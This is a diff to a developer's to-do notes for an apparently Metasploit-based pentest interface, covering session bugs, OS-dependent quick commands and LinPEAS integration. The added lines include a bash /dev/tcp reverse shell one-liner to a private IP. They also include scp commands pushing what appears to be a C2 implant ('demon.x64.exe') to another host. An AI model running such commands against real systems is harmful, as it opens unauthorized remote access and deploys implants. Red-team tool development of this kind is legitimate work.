@@ -42,7 +42,7 @@ need to able to background sessions and return to them via a button
 
 sudo -l
 sudo: a terminal is required to read the password; either use the -S option to read from standard input
-or configure an askpass helper 
+or reconfigure as an askpass helper 
 
 sudo: a password is required
 
@@ -51,13 +51,18 @@ msf command line sending command twice
 
 Quick Commands should be listed for windows and or for linux dependent on the hosts os
 
-[ERROR] Session not found
-[!] Disconnected. Reconnecting in 1s (attempt 1/5)...
-[*] Connected to metasploit console
-[ERROR] Session not found
-
-
 I want to incorporate Linpeas and PEASS to be runnable dependent on OS detected,
 the results from these scans are filtered for useful information to include in the report
 
 rewrite the README.md and QUICKSTART.md to reflect the current version
+
+Add Useful command examples 
+
+Rev Shell
+0<&196;exec 196<>/dev/tcp/192.168.0.17/4444; sh <&196 >&196 2>&196
+
+scp
+scp -r ~/Payloads/Bash\ Scripts/pingsweep.sh master@192.168.0.11:/home/master
+
+scp -r demon.x64.exe  9422@192.168.0.173:/Users/9422/Downloads/
+
